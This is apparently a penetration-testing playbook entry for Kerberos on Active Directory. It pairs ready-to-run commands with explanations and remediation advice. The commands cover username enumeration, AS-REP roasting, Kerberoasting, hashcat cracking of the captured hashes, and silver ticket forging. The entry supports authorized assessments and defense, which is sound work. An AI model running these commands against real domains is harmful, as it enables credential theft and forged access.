---
id: kerberos
technology: "Kerberos (AD KDC)"
domain: IT
safety_class: safe
severity: critical
life_safety: false
match:
  ports: [88, 464]
  banners: ["kerberos", "krb5", "kdc", "microsoft kerberos"]
  markers: ["krb5", "KRB5_AP_ERR", "KERB-ERROR", "krb-error", "e-data", "PA-ENC-TIMESTAMP"]
quick_wins:
  - { cmd: "nmap -sV -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='{domain}',userdb=/usr/share/wordlists/seclists/Usernames/Names/names.txt {host}", safety: safe, note: "Enumerate valid AD usernames via Kerberos pre-auth error distinction (AS-REQ oracle, no creds needed)" }
  - { cmd: "nmap -p 88 --script krb5-enum-users -sV {host}", safety: safe, note: "Basic Kerberos service fingerprint and realm detection" }
  - { cmd: "impacket-GetNPUsers '{domain}/' -dc-ip {host} -no-pass -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/asrep_hashes.txt", safety: intrusive, note: "AS-REP roasting: request TGTs for accounts with Kerberos pre-auth disabled; captures crackable RC4/AES hashes offline" }
  - { cmd: "impacket-GetUserSPNs '{domain}/{user}:{password}' -dc-ip {host} -request -outputfile /tmp/kerberoast_hashes.txt", safety: intrusive, note: "Kerberoasting: request TGS tickets for service accounts with SPNs; encrypted with service account's NTLM hash, crackable offline" }
  - { cmd: "netexec ldap {host} -u '{user}' -p '{password}' --asreproast /tmp/asrep.txt", safety: intrusive, note: "NetExec AS-REP roast via LDAP enumeration of accounts without pre-auth requirement" }
  - { cmd: "netexec ldap {host} -u '{user}' -p '{password}' --kerberoasting /tmp/kerb.txt", safety: intrusive, note: "NetExec Kerberoasting via LDAP SPN enumeration followed by TGS requests" }
  - { cmd: "hashcat -m 18200 /tmp/asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force", safety: intrusive, note: "Offline crack of AS-REP hashes (mode 18200 = Kerberos 5 AS-REP etype 23); run on attacker box, no network traffic" }
  - { cmd: "hashcat -m 13100 /tmp/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force", safety: intrusive, note: "Offline crack of Kerberoast TGS hashes (mode 13100 = Kerberos 5 TGS etype 23 RC4); no domain traffic after capture" }
  - { cmd: "impacket-ticketer -nthash '{ntlm_hash}' -domain-sid '{domain_sid}' -domain '{domain}' -spn 'cifs/{target_host}' '{service_account}'", safety: disruptive, note: "Silver ticket forging — creates forged TGS for a specific service bypassing KDC; requires compromised service account hash; gated write-equivalent" }
references: ["CVE-2022-33679", "CVE-2021-42287", "CVE-2021-42278", "CVE-2020-17049", "CVE-2014-6324"]
mitre: "T1558"
---
# Kerberos (AD KDC) guidance

Kerberos is the default authentication protocol for Active Directory environments, running on TCP/UDP port 88 on every Domain Controller. The Key Distribution Center (KDC) issues Ticket-Granting Tickets (TGTs) and service tickets (TGS) that clients use to authenticate to resources without transmitting passwords. Port 464 (kpasswd) is the Kerberos password change service and also indicates a KDC. Identifying an open port 88 with a valid realm response is a reliable indicator of an AD domain controller and warrants full Kerberos attack-path enumeration.

For authorized assessments, the safe starting point is passive fingerprinting and username enumeration using the AS-REQ oracle: the KDC returns different error codes for non-existent users (KDC_ERR_C_PRINCIPAL_UNKNOWN) versus valid users whose pre-auth fails (KDC_ERR_PREAUTH_REQUIRED). This distinction allows unauthenticated username harvesting. The nmap krb5-enum-users NSE script automates this against a wordlist with no credential requirement and no account lockout risk under standard DC policy.

AS-REP roasting targets accounts with "Do not require Kerberos preauthentication" set (a misconfiguration common in service and legacy accounts). An unauthenticated attacker can request a TGT for these accounts; the KDC returns a response encrypted with the account's credential, which can be cracked offline. Kerberoasting requires a low-privilege domain account and requests TGS tickets for accounts with Service Principal Names (SPNs). The ticket is encrypted with the service account's NTLM hash and cracked offline using hashcat modes 18200 (AS-REP) and 13100 (TGS-REP). Both attacks produce no authentication failures and generate only successful Kerberos ticket events (4768/4769), making them low-noise but high-value during an engagement. Both are classified intrusive because they involve active ticket requests against the KDC.

Remediation priorities: enforce Kerberos pre-authentication on all accounts, audit and reduce SPN-bearing accounts, rotate service account passwords to long random strings (or migrate to Group Managed Service Accounts), enable AES-only encryption to prevent RC4 downgrade, and baseline Kerberos event logs (4768, 4769, 4771) for anomalous volume or unusual encryption types. For PAC validation bypass vulnerabilities (noPac, CVE-2021-42278/42287), patch November 2021 or later cumulative updates.
